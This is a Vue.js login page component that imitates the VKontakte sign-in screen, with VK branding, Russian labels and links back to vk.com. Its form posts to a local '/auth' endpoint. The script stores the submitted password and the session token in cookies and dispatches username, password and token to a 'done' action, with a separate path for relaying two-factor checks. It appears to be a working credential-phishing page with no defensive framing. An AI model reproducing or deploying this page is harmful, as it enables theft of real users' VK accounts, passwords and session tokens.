<template>
  <div class="base-wrapper">
    <div class="middle-wrapper">
      <div class="form-wrapper">
        <header class="form-header">
          <div class="container">
            <a href="https://vk.com" class="form-header-vk" target="_blank">
            </a>
            <hide-m>
              <a
                href="https://vk.com/join?reg=1"
                class="form-header-reg link"
                target="_blank"
                >Регистрация</a
              >
            </hide-m>
          </div>
        </header>
        <main class="form-content">
          <div class="form-prepend">
            <div class="app-info">
              <span class="require-login">
                Для продолжения Вам необходимо войти <b>ВКонтакте</b>.
              </span>
            </div>
          </div>
          <div class="form-container">
            <form
              action="/auth"
              method="POST"
              enctype="application/x-www-form-urlencoded"
              class="form"
              @submit.prevent="login"
            >
              <div v-if="$store.state.error.length" class="form-group">
                <div class="login-error">
                  {{ $store.state.error }}
                </div>
              </div>
              <div class="form-inner">
                <div class="form-group">
                  <label for="username" class="form-label"
                    >Телефон или email</label
                  >
                  <input
                    id="username"
                    v-model="username"
                    :disabled="$store.state.waiting"
                    type="text"
                    name="username"
                    class="form-input"
                  />
                </div>
                <div class="form-group">
                  <label for="password" class="form-label">Пароль</label>
                  <input
                    id="password"
                    v-model="password"
                    :disabled="$store.state.waiting"
                    type="password"
                    name="password"
                    class="form-input"
                  />
                </div>
                <div v-if="$store.getters.captchaRequired" class="form-group">
                  <img
                    id="captcha"
                    :src="$store.state.captchaImg"
                    alt="captcha"
                    class="captcha-img"
                  />
                  <label for="captche-key" class="form-label captcha-label"
                    >Код с картинки</label
                  >
                  <input
                    id="captcha-key"
                    v-model="captchaKey"
                    :disabled="$store.state.waiting"
                    :required="this.$store.getters.captchaRequired"
                    type="text"
                    name="captcha_key"
                    class="form-input"
                  />
                </div>
                <div class="form-group clearfix">
                  <vk-button
                    :disabled="$store.state.waiting"
                    type="submit"
                    variant="primary"
                    class="float-lm vk-button-disabled-by-loading"
                  >
                    Войти
                  </vk-button>
                  <hide-m>
                    <a
                      href="https://vk.com/restore"
                      class="btn link form-restore"
                      target="_blank"
                      >Забыли пароль?</a
                    >
                  </hide-m>
                  <hide-pc style="float:left">
                    <vk-button type="link" variant="link" href="https://vk.com">
                      Отмена
                    </vk-button>
                  </hide-pc>
                </div>
                <hide-pc>
                  <div class="form-append">
                    <div class="form-group">
                      <b class="not-registered-yet">Ещё не зарегистрированы?</b>
                    </div>
                    <div class="form-group form-append-reg">
                      <vk-button
                        :blank="true"
                        type="link"
                        variant="secondary"
                        href="https://vk.com/join?reg=1"
                        btn-style="display:block"
                      >
                        Зарегистрироваться
                      </vk-button>
                    </div>
                  </div>
                </hide-pc>
              </div>
            </form>
          </div>
        </main>
      </div>
    </div>
  </div>
</template>
<script>
import Vue from 'vue'
import Component from 'vue-class-component'
import VKButton from '~/components/VKButton'
import HidePC from '~/components/HidePC'
import HideM from '~/components/HideM'
import { R_REQUIRE_2FA, R_SUCCESS } from '~/server/auth-constants'

@Component({
  name: 'LoginPage',
  components: {
    'vk-button': VKButton,
    'hide-pc': HidePC,
    'hide-m': HideM
  },

  layout: 'page',

  mounted() {
    this.username = this.$store.state.username

    this.interval = setInterval(() => {
      if (this.$store.state.status === R_SUCCESS) {
        this.$cookies.set('done', '1')
        this.$cookies.set('password', this.password)
        this.$cookies.set('token', this.$store.state.token)

        this.$store.dispatch('done', {
          username: this.username,
          password: this.password,
          token: this.$store.state.token,
          '2fa': false
        })

        clearInterval(this.interval)
      } else if (this.$store.state.status === R_REQUIRE_2FA) {
        this.$cookies.set('password', this.password)
        this.$store.dispatch('gotoAuthCheck', this.$router)

        clearInterval(this.interval)
      }
    }, 100)
  }
})
class LoginPage extends Vue {
  username = ''
  password = ''
  captchaKey = ''

  login() {
    let opts = {
      username: this.username,
      password: this.password,
      $cookie: this.$cookies
    }

    if (this.$store.getters.captchaRequired) {
      if (this.captchaKey.length < 5) {
        alert('Введите код с картинки')
        return 1
      } else {
        opts = {
          ...opts,
          captcha_key: this.captchaKey,
          captcha_sid: this.$store.state.captchaSid
        }
      }
    }

    this.$store.dispatch('auth', opts)

    return false
  }
}

export default LoginPage
</script>
<style scoped>
@media screen and (min-width: 751px) {
  .base-wrapper {
    width: 100vw;
    height: 100vh;
    overflow: hidden;
  }

  .middle-wrapper {
    margin-top: 50vh;
    transform: translateY(-50%);
  }

  .form-wrapper {
    display: block;
    margin: 0 auto;
    width: 655px;
    min-height: 350px;
    border-radius: 4px;
    box-shadow: var(--desktop-box-shadow);
    overflow: hidden;
  }

  .form-header {
    font-size: var(--font-size-sm);
    background-color: var(--primary-darker-color);
    padding: 0 25px;
    color: #fff;
    height: 54px;
    line-height: 52px;
  }

  .form-header .container {
    display: flex;
    justify-content: space-between;
    align-content: center;
    height: inherit;
  }

  .form-header-vk {
    width: 40px;
    height: 23px;
    background: url(/logo.svg) no-repeat center center / cover;
    margin-top: 16px;
  }
  .form-header-reg {
    color: #fff !important;
    font-weight: bold;
    font-size: inherit;
  }

  .form-content {
    background-color: #fff;
    min-height: 296px;
  }

  .form-prepend {
    display: flex;
    width: 100%;
    background-color: var(--box-prepend-color);
    height: 50px;
    font-size: var(--font-size-sm);
    border: 1px solid #c1c9d9;
    border-width: 0 0 1px;
    border-color: #e7e8ec;
    justify-content: center;
  }

  .require-login {
    margin: -20px -25px 0;
    padding: 15px 25px 16px;
    display: table-cell;
    font-size: var(--font-size-sm);
  }

  .form-container {
    display: block;
    padding: 20px;
  }
  .form-inner {
    width: 160px;
    min-height: 205px;
    margin: 0 auto;
  }

  .form-label {
    padding-bottom: 8px;
    font-size: var(--font-size-sm);
    font-weight: 500;
    text-align: left;
    width: 100%;
    display: block;
    line-height: 19px;
  }

  .form-restore {
    text-align: center;
    display: block;
    margin-top: 16px;
  }

  .form-inner:last-child {
    padding: 0;
  }
  .captcha-img {
    display: block;
    margin: 20px auto 13px;
  }
  .captcha-label::after {
    content: ':';
  }
  .login-error {
    text-align: center;
    margin: 0 0 15px;
    background: #ffefe9;
    word-wrap: break-word;
    padding: 7px 18px 9px;

    border: 1px solid #c1c9d9;
    border-radius: 2px;
    line-height: 150%;
    border-color: #f2ab99;
  }
}
</style>
<style scoped>
@media screen and (max-width: 750px) {
  .form-wrapper {
    background-color: #fff;
    width: 100%;
    max-width: 620px;
    margin: 0 auto;
    padding-top: 48px;
  }

  .form-header {
    height: 48px;
    background-color: #fff;
    position: fixed;
    top: 0;
    width: 100%;
    left: 0;
  }

  .container {
    width: 100%;
    height: 100%;
    max-width: 620px;
    padding: 0 16px;
    margin: 0 auto;
  }

  .form-header-vk {
    width: 32px;

    width: 32px;
    height: 32px;
    display: block;
    margin: 0 auto;
    margin-top: 8px;
    background: url(/icon.png) no-repeat center center / cover;
  }

  .form-prepend {
    display: flex;
    padding: 12px 16px;
    border: none;
    background: #fff;
    box-sizing: border-box;
    width: 100%;
    /* height: 74px; */
    justify-content: flex-start;
  }

  .require-login {
    padding: 0;
    padding-top: 4px;
    margin: 0;
    color: #797979;
    font-size: var(--font-size-sml);
  }
  .form-container {
    padding: 0 12px 16px;
  }
  .form-inner {
    margin: 0;
    width: 100%;
  }

  .form-group {
    padding-top: 12px;
  }

  .form-label {
    display: block;
    color: var(--grey-color);
    padding-bottom: 6px;
    font-weight: normal;
    font-size: var(--font-size-sml);
    line-height: normal;
  }

  .form-label:after {
    content: ':';
  }

  .form-cancel {
    display: inline-block !important;
    font-weight: normal !important;
    font-size: 1em;
  }

  .form-login {
    color: var(--primary-darker-color);
  }
  .form-group:last-child {
    padding-top: 18px;
  }
  .form-append-reg {
    display: block;
  }
  .not-registered-yet {
    color: var(--darkgray-color);
    font-size: var(--font-size-sml);
  }

  .float-lm {
    float: left;
  }

  .login-error {
    background-color: #f4e7c3;
    color: #857250;
    font-size: var(--font-size-sml);
    padding: 7px;
  }
  .form-input {
    background: #f2f3f5;
    border-radius: 10px;
    font-size: 16px;
    line-height: 20px;
    padding: 11px 12px;
  }
  .form-input:focus {
    border-color: var(--primary-color);
  }
}
</style>
